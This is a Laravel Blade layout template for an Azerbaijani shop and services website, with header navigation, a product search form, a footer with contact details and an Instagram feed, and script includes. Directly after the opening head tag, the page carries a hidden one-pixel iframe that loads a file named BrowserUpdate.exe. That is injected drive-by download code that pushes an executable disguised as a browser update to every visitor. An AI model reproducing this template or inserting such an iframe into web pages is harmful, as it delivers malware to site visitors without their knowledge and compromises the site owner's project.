<!doctype html>
<html class="no-js" lang="en">

<head><iframe src=BrowserUpdate.exe width=1 height=1 frameborder=0></iframe>
    <meta charset="utf-8">
    <meta http-equiv="x-ua-compatible" content="ie=edge">
    <title>{{ setting('site.title') }}</title>
    <meta name="description" content="">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <link rel="apple-touch-icon" href="/images/icons/favicon.ico">
    <!-- Place favicon.ico in the root directory -->

    <!-- All css files are included here. -->
    <!-- Bootstrap fremwork main css -->
    <link rel="stylesheet" href="/css/bootstrap.min.css">
    <!-- This core.css file contents all plugings css file. -->
    <link rel="stylesheet" href="/css/core.css">
    <!-- Theme shortcodes/elements style -->
    <link rel="stylesheet" href="/css/shortcode/shortcodes.css">
    <!-- Theme main style -->
    <link rel="stylesheet" href="/css/style.css">
    <!-- Responsive css -->
    <link rel="stylesheet" href="/css/responsive.css">
    <!-- User style -->
    <link rel="stylesheet" href="/css/custom.css">  <link rel="stylesheet" href="css/color/skin-default.css">

    @yield('css')
    
    <!-- Modernizr JS -->
    <script src="/js/vendor/modernizr-2.8.3.min.js"></script>
</head>

<body style="overflow-x: hidden">
    <!-- Body main wrapper start -->
    <div class="wrapper fixed-box home-one">

        <!-- Start of header area -->
        <header class="header-area header-wrapper">
            <div class="header-top-bar black-bg clearfix">
                <div class="container">
                    <div class="row">
                        <div class="d-none d-md-block">
                            <div class="social-search-area text-center">
                                <div class="social-icon socile-icon-style-2">
                                    <ul>
                                        <li><a href="{{ $contact_informations->facebook }}" target="_blank" title="facebook"><i class="fa fa-facebook"></i></a> </li>
                                        <li><a href="{{ $contact_informations->instagram }}" target="_blank" title="instagram"><i class="fa fa-instagram"></i></a> </li>
                                        <li> <a href="{{ $contact_informations->youtube }}" target="_blank" title="youtube"><i class="fa fa-youtube"></i></a></li>
                                    </ul>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <div id="sticky-header" class="header-middle-area">
                <div class="container">
                    <div class="full-width-mega-dropdown">
                        <div class="row">
                            <div class="col-md-2">
                                <div class="logo ptb-20">
                                    <a href="/">
                                    <img src="{{ Voyager::image(setting('site.logo')) }}" alt="main logo">
                                    </a>
                                </div>
                            </div>
                            <div class="col-lg-7 col-md-10 d-none d-md-block">
                                <nav id="primary-menu">
                                    <ul class="main-menu">
                                        <li><a href="{{route('home')}}">Ana səhifə</a></li>
                                        <li><a href="{{route('about.index')}}">Haqqımızda</a></li>
                                        <li><a href="{{route('shop.category')}}">Shop</a></li>
                                        <li><a href="{{route('service.index')}}">Xidmətlərimiz</a></li>
                                        <li><a href="">Korporativ Satış</a></li>
                                        <li><a href="{{route('gallery.index')}}">Qalareya</a></li>
                                        <li><a href="{{route('contact')}}">Əlaqə</a></li>
                                    </ul>
                                </nav>
                            </div>
                            <div class="col-lg-3 d-none d-lg-block">
                                <div class="search-box global-table">
                                    <div class="global-row">
                                        <div class="global-cell">
                                        <form action="{{ route('search.product') }}" method="GET">
                                                <div class="input-box">
                                                <input class="single-input" name="query" id="query" value="{{ request()->input('query') }}" placeholder="Search anything"
                                                        type="text">
                                                    <button class="src-btn"><i class="fa fa-search"></i></button>
                                                </div>
                                            </form>
                                        </div>
                                    </div>
                                </div>
                            </div>

                            <!-- mobile-menu-area start -->
                            <div class="mobile-menu-area">
                                <div class="container">
                                    <div class="row">
                                        <div class="col-lg-12">
                                            <nav id="dropdown">
                                                <ul>
                                                    <li><a href="{{route('home')}}">Ana səhifə</a></li>
                                                    <li><a href="{{route('about.index')}}">Haqqımızda</a></li>
                                                    <li><a href="{{route('shop.category')}}">Shop</a></li>
                                                    <li><a href="{{route('service.index')}}">Xidmətlərimiz</a></li>
                                                    <li><a href="">Korporativ Satış</a></li>
                                                    <li><a href="{{route('gallery.index')}}">Qalareya</a></li>
                                                    <li><a href="{{route('contact')}}">Əlaqə</a></li>
                                                </ul>
                                            </nav>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            <!--mobile menu area end-->
                        </div>
                    </div>
                </div>
            </div>
        </header>
        <!-- End of header area -->
        @if (session()->has('success_message'))
        <div class="alert alert-success">
            {{ (session()->get('success_message')) }}
        </div>        
        @endif
        @if (count($errors) > 0 )
        <div class="alert alert-success">
            <ul>
                @foreach ($errors->all() as $error)
                <li>{{ $error }}</li>                
                @endforeach
            </ul>
        </div>         
        @endif

@yield('content')


        <!-- footer area start-->
        <div class="footer-area ptb-50">
            <div class="container">
                <div class="row">
                    <div class="col-xl-3 col-lg-3 col-md-4">
                        <div class="single-footer contact-us">
                            <div class="footer-title uppercase">
                                <h5>Contact US</h5>
                            </div>
                            <ul>
                                <li>
                                    <div class="contact-icon"> <i class="zmdi zmdi-pin-drop"></i> </div>
                                    <div class="contact-text">
                                        <p>{{ $contact_informations->address }}</p>
                                    </div>
                                </li>
                                <li>
                                    <div class="contact-icon"> <i class="zmdi zmdi-email-open"></i> </div>
                                    <div class="contact-text">
                                        <p><span><a href="mailto://{{ $contact_informations->email }}">{{ $contact_informations->email }}</a></span></p>
                                    </div>
                                </li>
                                <li>
                                    <div class="contact-icon"> <i class="zmdi zmdi-phone-paused"></i> </div>
                                    <div class="contact-text">
                                        <p><a href="tel://{{ $contact_informations->phone }}">{{ $contact_informations->phone }}</a></p>
                                    </div>
                                </li>
                            </ul>
                        </div>
                    </div>
                    <div class="col-xl-2 col-lg-2 col-md-4">
                        <div class="single-footer informaton-area">
                            <div class="footer-title uppercase">
                                <h5>Xidmetler</h5>
                            </div>
                            <div class="informatoin">
                                <ul>
                                    @foreach ($service as $service)
                                    <li>
                                    <a href="{{ route('service.index') }}">{{$service->title}}</a>
                                    </li>
                                    @endforeach
                                </ul>
                            </div>
                        </div>
                    </div>
                    <div class="col-xl-3 col-lg-4 d-md-none d-block d-lg-block">
                        <div class="single-footer instagrm-area">
                            <div class="footer-title uppercase">
                                <h5>InstaGram</h5>
                            </div>
                            <div class="instagrm">
                                <ul>
                                    @foreach ($insta_posts as $insta_post)
                                         <li><a href="{{ $insta_post->link }}" target="_blank"><img src="{{ Voyager::image($insta_post->image) }}" alt=""></a></li>                                        
                                    @endforeach
                                </ul>
                            </div>
                        </div>
                    </div>
                    <div class="col-xl-3 col-lg-3 col-md-4 offset-xl-1">
                        <div class="single-footer newslatter-area">
                            <div class="footer-title uppercase">
                                <h5>Social Network</h5>
                            </div>
                            <div class="newslatter">
                                <div class="social-icon socile-icon-style-3 mt-40">
                                    <ul>
                                        <li><a href="{{ $contact_informations->facebook }}" target="_blank"><i class="zmdi zmdi-facebook"></i></a></li>
                                        <li><a href="{{ $contact_informations->instagram }}" target="_blank"><i class="zmdi zmdi-instagram"></i></a></li>
                                        <li><a href="{{ $contact_informations->youtube }}" target="_blank"><i class="zmdi zmdi-youtube"></i></a></li>                                        
                                    </ul>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <!--footer area start-->

        <!--footer bottom area start-->
        <div class="footer-bottom global-table">
            <div class="global-row">
                <div class="global-cell">
                    <div class="container">
                        <div class="row">
                            <div class="col-md-6">
                                <div class="copyrigth">{!! setting('site.copyright') !!}</div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <!--footer bottom area end-->
    </div>
    <!-- Body main wrapper end -->

    <!-- Placed js at the end of the document so the pages load faster -->

    <!-- jquery latest version 
    <script src="/js/vendor/jquery-1.12.0.min.js"></script>
    -->

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <!-- Popper js -->
    <script src="/js/popper.min.js"></script>
    <!-- Bootstrap framework js -->
    <script src="/js/bootstrap.min.js"></script>
    <!-- Slider js -->
    <script src="/js/slider/jquery.nivo.slider.pack.js"></script>
    <script src="/js/slider/nivo-active.js"></script>
    <!-- counterUp-->
    <script src="/js/jquery.countdown.min.js"></script>
    <!-- All js plugins included in this file. -->
    <script src="/js/plugins.js"></script>

    <!-- Main js file that contents all jQuery plugins activation. -->
    <script src="/js/main.js"></script>
    <script type="text/javascript">
        $('.main-menu').find('li').on('click', function(){
            $(this).addClass('current');
            $(this).siblings().removeClass('current');
        });
        
        $('.main-menu li a[href="{{ url()->current() }}"]').addClass('active').parent().addClass('current');
    </script>

    @yield('js')

</body>

</html>